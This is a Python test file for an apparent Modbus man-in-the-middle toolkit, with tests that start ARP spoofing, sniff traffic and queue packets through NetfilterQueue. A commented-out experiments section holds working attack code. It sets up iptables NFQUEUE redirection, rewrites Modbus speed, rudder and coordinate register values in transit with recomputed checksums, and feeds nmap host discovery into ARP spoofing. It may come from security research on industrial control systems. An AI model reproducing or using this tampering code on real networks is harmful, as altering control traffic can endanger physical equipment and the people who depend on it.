import ARP_Spoofing as arp
import Sniffing as sniffer
import Net_Filter_Queue as nfq
import Modbus as mb
import Buffer as buffer
import time as Time


class tests:

    # in progress
    def stop_all():
        arp.stop()
        sniffer.stop()

    # Passed
    def arp_spoofing():

        arp.start(verbose=True)

        input("Press Enter to stop")

        arp.stop()

    # Passed
    def sniffing():
        
        arp.start()

        sniffer.start(sniffer.handlers.print_scannable)

        input("Press Enter to stop")

        sniffer.stop()

        arp.stop()

    # Passed
    def nfq():
        arp.start()

        # Pick one
        # nfq.start(nfq.callbacks.print_and_accept)
        nfq.start(nfq.callbacks.print_and_modify)

        input("Press Enter to change values")

        mb.set_table_to(10)

        input("Press Enter to stop modifying values")

        nfq.stop()

        nfq.start(nfq.callbacks.print_and_accept)

        input("Press Enter to stop")

        nfq.stop()

        arp.stop()

    # Passed
    def sniffer_buffer():
        arp.start()

        sniffer.start(sniffer.handlers.put_modbus_in_buffer)

        input("Press Enter to print from buffer (3 remaining)")

        buffer.get_last("packets", "in")[0].show()

        input("Press Enter to print from buffer (2 remaining)")

        buffer.get_last("packets", "in")[0].show()


        input("Press Enter to print from buffer (1 remaining)")

        buffer.get_last("packets", "in")[0].show()


        input("Press Enter to print from buffer (0 remaining)")

        buffer.get_last("packets", "in")[0].show()


        input("Press Enter to stop")

        sniffer.stop()
        buffer.clear()
        arp.stop()

    # Passed
    def nfq_buffer():
        arp.start()

        # Pick one
        # nfq.start(nfq.callbacks.buffer_and_accept)
        nfq.start(nfq.callbacks.buffer_and_modify)

        input("Press Enter to print from buffer (3 remaining)")

        buffer.get_last("packets", "in")[0].show()


        input("Press Enter to print from buffer (2 remaining)")

        buffer.get_last("packets", "in")[0].show()

        input("Press Enter to print from buffer (1 remaining)")

        buffer.get_last("packets", "in")[0].show()

        input("Press Enter to print from buffer (0 remaining)")

        buffer.get_last("packets", "in")[0].show()

        input("Press Enter to stop")

        nfq.stop()
        buffer.clear()
        arp.stop()
    
    def get_knit_packets():
        arp.start()

        # Pick one
        nfq.start(nfq.callbacks.buffer_and_accept)
        # nfq.start(nfq.callbacks.buffer_and_modify)

        input("Press Enter to print a table of all packets")

        all = buffer.get_knit_packets()

        for p in all:
            # packet, time, number, direction
            # Number, time, direction, scannable
            print(p[2],"\t", Time.localtime(p[1])[5],"\t", p[3],"\t", mb.print_scannable(p[0], print_to_console=False))

        input("Press Enter to stop")

        nfq.stop()
        buffer.clear()
        arp.stop()

    def get_knit_coordinates():
        arp.start()

        nfq.start(nfq.callbacks.buffer_and_modify)

        input("Press Enter to print a table of received coordinates")

        coords = buffer.get_knit_coordinates()

        print("x\ty")

        for c in coords[0]:
            print(c[0],"\t",c[1])

        input("Press Enter to print a table of forwarded coordinates")
      
        print("x\ty")

        for c in coords[1]:
            print(c[0],"\t",c[1])

        input("Press Enter to stop")

        nfq.stop()
        buffer.clear()
        arp.stop()
    




if __name__ == "__main__":
    tests.get_knit_coordinates()



# # Experiments for testing problems and new features
# class experiments:

#     def callback_no_q(pkt):
#         spkt = IP(pkt.get_payload())

#         if spkt.haslayer("Read Holding Registers Response"):
#             mbl = spkt.getlayer(ModbusADUResponse)

#             print("Original speed:\t", mbl.payload.registerVal[0])
#             print("Original rudder:\t", mbl.payload.registerVal[1])

#             mbl.payload.registerVal[0] = 100
#             mbl.payload.registerVal[1] = 200

#         elif spkt.haslayer("Write Single Register"):
#             mbl = spkt.getlayer(ModbusADURequest)

#             print("Original coord:\t", mbl.payload.registerValue)
#             mbl.payload.registerValue = 90

#         else:
#             pkt.accept()
#             return

#         # Recalculate checksums
#         del spkt[TCP].chksum
#         del spkt[IP].chksum
#         del spkt[IP].len

#         pkt.set_payload(bytes(spkt))
#         pkt.accept()


#     def nmap():
#         nmapping.print_hosts(nmapping.get_local_ip())

#         print(f"\nYour IP: {nmapping.get_local_ip()}")


#         ips = nmapping.get_host_ips(nmapping.get_local_ip())
        
#         print("\nLocal devices found:\n","\n".join(ips),"\n\n")

#         devices = nmapping.get_hosts(nmapping.get_local_ip())

#         print("Device Information")

#         nmapping.print_host_info(devices)
        
#         device_info = nmapping.get_host_info(devices)
        

        


#         ip1 = input("Enter ip 1\n\n")
#         ip2 = input("Enter ip 2\n\n")

#         arp_spoofing.start(ip1, ip2, silence=True)

#         input("Press Enter to continue\n\n")

#         scapy_sniffing.start(print_console=True, put_buffer=False)

#         time.sleep(10)

#         scapy_sniffing.stop()
#         arp_spoofing.stop()

#     def nfq():

#         arp_spoofing.start()

#         # Configure math
#         mitm.rm = 0


#         # The print isn't the problem
#         def print_and_accept(pkt):
#             spkt = IP(pkt.get_payload())
#             mb.print_scannable(spkt)
#             pkt.accept()
        

#         # The mb class isn't the problem
#         def check_and_accept(pkt):
#             spkt = IP(pkt.get_payload())
#             if mb.is_commands(spkt) or mb.is_coord(spkt):
#                 print("yup")
#             mb.print_scannable(spkt)
#             pkt.accept()
        
#         # The alter is the problem?
#         def alter_and_accept(pkt):
#             spkt = IP(pkt.get_payload())
#             # mb.print_scannable(spkt)
#             if mb.is_commands(spkt):
#                 mb.set_rudder(spkt, 0)
#             # new_spkt = mb.modify_values(spkt, put_buffer=False)
#             mb.print_scannable(spkt)
#             del spkt[TCP].chksum
#             del spkt[IP].chksum
#             pkt.set_payload(bytes(spkt))
#             pkt.accept()

#         # Dropping the original and sending a scapy packet appears to work fine
#         def alter_bytes_and_drop(pkt):
#             spkt = IP(pkt.get_payload())
#             if mb.is_commands(spkt):
                
#                 vals = mb.get_commands(spkt)
#                 print(f"Original payload is: {vals}")

#                 # Change rudder (1) to 0
#                 spkt = mb.modify_values(spkt, False)
#                 print(f"Altered  payload is: {mb.get_commands(spkt)}")

#                 pkt.drop()
#                 scapy.send(spkt)

#                 # p2 = list(bytes())
#                 # print(f"P2 is {p2}")
#             # mb.print_scannable(spkt)
#             else:
#                 pkt.accept()


            

#         os.system("iptables -t mangle -A PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")

#         nfqueue = NetfilterQueue()
#         nfqueue.bind(1, alter_bytes_and_drop)
#         try:
#             print("try run")
#             nfqueue.run()
#         except KeyboardInterrupt:
#             pass
#         finally:

#             os.system("iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1") 
#             arp_spoofing.stop()
#             nfqueue.unbind()

#     def fd_nfq():
#         import select

#         stop_event = threading.Event()

#         def start_nfqueue():
#             arp_spoofing.start()

#             # IPTables rule
#             os.system("iptables -t mangle -A PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")

#             nfq = NetfilterQueue()
#             nfq.bind(1, experiments.callback_no_q)

#             qfd = nfq.get_fd()
#             poller = select.poll()
#             poller.register(qfd, select.POLLIN)

#             # Pipe for stop signaling
#             stop_r, stop_w = os.pipe()
#             poller.register(stop_r, select.POLLIN)

#             print("[*] NFQUEUE + Modbus MITM running...")

#             try:
#                 while not stop_event.is_set():
#                     events = poller.poll(500)
#                     for fd, _ in events:
#                         if fd == qfd:
#                             nfq.run(False)   # process packets without blocking
#                         elif fd == stop_r:
#                             stop_event.set()
#             finally:
#                 print("[*] Cleaning up…")
#                 nfq.unbind()
#                 os.close(stop_r)
#                 os.close(stop_w)
#                 os.system("iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")
#                 arp_spoofing.stop()
#                 print("[*] Clean exit.")

#         def stop_nfqueue():
#             stop_event.set()

#         t = threading.Thread(target=start_nfqueue, daemon=True)
#         t.start()

#         input("Press Enter to stop MITM...\n")
#         stop_nfqueue()
#         arp_spoofing.stop()
#         t.join()